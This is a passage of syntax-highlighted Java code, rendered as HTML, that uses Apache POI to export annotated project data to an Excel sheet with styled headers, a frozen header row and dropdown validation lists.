operator">></span> statusList<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> repositoryList<span class="token punctuation">,</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> depts<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span>ProjectListExcel<span class="token operator">></span> cls <span class="token operator">=</span> ProjectListExcel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Field<span class="token operator">></span> fieldList <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span>Comparator<span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        col <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> col<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String firstSheetName <span class="token operator">=</span> <span class="token string">"项目列表"</span><span class="token punctuation">;</span>        HSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFSheet sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">{</span>            Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            row<span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//写入头部</span>            fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String columnName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    columnName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                CellStyle cellStyle <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>WHITE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//垂直剧中</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//水平居左</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//下边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右边框</span>                Font font <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtils<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            dataList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                Row row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> type <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String dateFormat <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    Object value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Cell cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> Date<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            dateFormat <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            String formatValue <span class="token operator">=</span> DateUtil<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Date<span class="token punctuation">)</span> value<span class="token punctuation">,</span> dateFormat<span class="token punctuation">)</span><span class="token punctuation">;</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>formatValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//冻结窗格</span>        wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createFreezePane</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//下拉选项</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> industry_properties <span class="token operator">=</span> industryList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>industryList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> industry_properties<span class="token punctuation">,</span> <span class="token string">"行业"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> status_properties <span class="token operator">=</span> statusList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>statusList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> status_properties<span class="token punctuation">,</span> <span class="token string">"项目状态"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> repository_properties <span class="token operator">=</span> repositoryList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>repositoryList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> repository_properties<span class="token punctuation">,</span> <span class="token string">"所在库"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//下拉选项</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> textlist_properties <span class="token operator">=</span> depts<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span>depts<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">,</span> textlist_properties<span class="token punctuation">,</span> <span class="token string">"所属镇办名称"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>wb<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 通用导出excel     *     * @param response     * @param dataList       数据列表     * @param cls            数据所属对象class     * @param firstSheetName 表格名称     * @param &lt;T>     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token keyword">void</span> <span class="token function">writePlotExcel</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>T<span class="token operator">></span> dataList<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> cls<span class="token punctuation">,</span> String firstSheetName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>Field<span class="token operator">></span> fieldList <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span>fields<span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span>Comparator<span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        col <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> col<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFSheet sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>firstSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//使用Map存放哪个字段对应的列数 需要有单选下拉框</span>        Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> singleComboBoxMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">{</span>            Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            row<span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//写入头部</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fieldList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Field field <span class="token operator">=</span> fieldList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String columnName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                String<span class="token punctuation">[</span><span class="token punctuation">]</span> singleComboBox <span class="token operator">=</span> null<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    columnName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    singleComboBox <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">singleComboBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>singleComboBox<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        singleComboBoxMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> singleComboBox<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                CellStyle cellStyle <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>SKY_BLUE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//垂直剧中</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//水平居左</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//下边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上边框</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右边框</span>                Font font <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//fieldList.forEach(field -> {</span>            <span class="token comment" spellcheck="true">//});</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token 